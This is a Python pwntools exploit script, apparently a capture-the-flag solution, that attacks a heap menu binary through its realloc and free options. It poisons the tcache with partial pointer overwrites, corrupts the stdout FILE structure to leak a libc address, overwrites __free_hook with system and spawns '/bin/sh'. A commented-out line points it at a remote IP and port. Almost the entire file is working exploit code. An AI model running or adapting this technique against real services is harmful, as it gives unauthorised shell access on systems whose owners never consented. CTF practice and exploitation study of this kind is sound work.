#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './pwn'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('39.97.182.233', 37783)
# elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/gx &realloc_ptr
        end

    b realloc
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def realloc(size, content):
    sh.sendlineafter('>> ', '1')
    sh.sendlineafter('?\n', str(size))
    sh.sendafter('?\n', str(content))

def free():
    sh.sendlineafter('>> ', '2')



realloc(0x68, '\n')
free()
realloc(0x18, '\n')
realloc(0, '')
realloc(0x48, '\n')
free()
realloc(0, '')

heap_two_byte = random.randint(0, 0xf) * 0x1000 + 0x0010
log.info('heap_two_byte: ' + hex(heap_two_byte))
# realloc(0x68, 'a' * 0x18 + p64(0x201) + p16(0x7010))
realloc(0x68, 'a' * 0x18 + p64(0x201) + p16(heap_two_byte))
realloc(0, '')
realloc(0x48, '\n')

realloc(0, '')

# sh.sendlineafter('>> ', '666')
realloc(0x48, '\xff' * 0x40)
# realloc(0x58, 'a' * 0x18 + '' * 0x20 + p64(0x1f1) + p16(0x7050))
realloc(0x58, 'a' * 0x18 + '' * 0x20 + p64(0x1f1) + p16(heap_two_byte + 0x40))
realloc(0, '')

realloc(0x18, p64(0) + p64(0))
realloc(0, '')

two_byte = random.randint(0, 0xf) * 0x1000 + 0x0760
log.info('two_byte: ' + hex(two_byte))
# realloc(0x1e8, p64(0) * 4 + 'x60x07xdd')
realloc(0x1e8, p64(0) * 4 + p16(two_byte))
realloc(0, '')

realloc(0x58, p64(0xfbad2887 | 0x1000) + p64(0) * 3 +p8(0xc8))

result = sh.recvn(8)
libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))
sh.sendlineafter('>> ', '666')
realloc(0x1e8, 'a' * 0x18 + p64(libc_addr + libc.symbols['__free_hook'] - 8))
realloc(0, '')
realloc(0x48, '/bin/sh' + p64(libc_addr + libc.symbols['system']))
sh.sendlineafter('>> ', '1')
sh.sendlineafter('?\n', str(0))

sh.interactive()
clear()